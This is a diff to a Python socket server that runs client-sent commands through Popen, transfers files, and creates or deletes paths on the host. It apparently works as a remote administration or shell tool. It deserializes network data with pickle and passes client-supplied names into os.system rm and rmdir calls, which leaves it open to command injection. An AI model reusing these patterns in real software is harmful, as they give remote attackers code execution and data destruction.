@@ -6,7 +6,6 @@ import os
 from _thread import start_new_thread,exit as E
 import re
 import pickle
-import time
 class main:
     def __init__(self) -> None:
         if os.name == 'nt':
@@ -25,9 +24,9 @@ class main:
             if "#01#" == commande[0]:
                 client.send(pickle.dumps(["#01#",Popen(commande[1],stdout=PIPE).communicate()[0]]))
             elif "#02#" == commande[0]:
-                client.send(pickle.dumps(os.listdir(self.path[client])))
+                client.send(pickle.dumps(["#03#",os.listdir(self.path[client])]))
             elif "#03#" == commande[0]:
-                if not "." in commande[1] and type(commande[1]) == type(""):
+                if isdir(join(self.path[client],commande[1])):
                     self.path[client] = join(self.path[client],commande[1])
                     client.send(pickle.dumps(["#03#",os.listdir(self.path[client])]))
             elif "#04#" == commande[0]:
@@ -65,31 +64,51 @@ class main:
                             client.send(l)
                             l = f.read(int(getsize(tempo)*1.2   ))
                         if not l:
-                            client.send("stop".encode("utf-8"))
+                            client.send(None)
                             f.close()
                             break
                 else:
                     client.send(pickle.dumps(["#50#",""]))
             elif commande[0] == "#06#":
                 while True:
-                    test = pickle.loads(client.recv(1024))
+                    test = commande
                     if test:
-                        print("test 1",test)
                         if test[0] == "#06#":
                             f = open(join(self.path[client],test[1]), 'wb')
                             while True:
                                 data = client.recv(int(test[2]))
-                                if not data:
-                                    f.close()
-                                    break
+                                try:
+                                    if pickle.loads(data) == ["#60#",""]:
+                                        f.close()
+                                        client.send(pickle.dumps(["#03#",os.listdir(self.path[client])]))
+                                        print("test")
+                                        break
+                                except Exception as er:
+                                    pass
                                 f.write(data)
+                                data = ""
                         elif test[0] == "#60#":
                             break
                         break
                 client.send(pickle.dumps(["#03#",os.listdir(self.path[client])]))
+            elif commande[0] == "#07#":
+                if isdir(join(self.path[client],commande[1])):
+                    pass
+                else:
+                    os.mkdir(join(self.path[client],commande[1]))
+                    client.send(pickle.dumps(["#03#",os.listdir(self.path[client])]))
+            elif commande[0] == "#08#":
+                if isdir(join(self.path[client],commande[1])):
+                    if os.name == "nt":
+                        os.system(f"rmdir {join(self.path[client],commande[1])} /S /Q")
+                    else:
+                        os.system(f"rm {join(self.path[client],commande[1])} -r")
+                else:
+                    os.remove(join(self.path[client],commande[1]))
+                client.send(pickle.dumps(["#03#",os.listdir(self.path[client])]))
         except Exception as er:
             try:
-                client.send(f"{er}".encode("utf-8"))
+                client.send(pickle.dumps(["#er#",f"{er}".encode("utf-8")]))
             except:
                 pass
 
@@ -102,7 +121,7 @@ class main:
                 self.path.pop(client)
                 break
             if msg_recu and "#" in msg_recu[0]:
-                self.commande(msg_recu,client)
+                start_new_thread(self.commande,(msg_recu,client,))
 
     def co_ini_distant(self):
         if self.config[2] == "127.0.0.1":
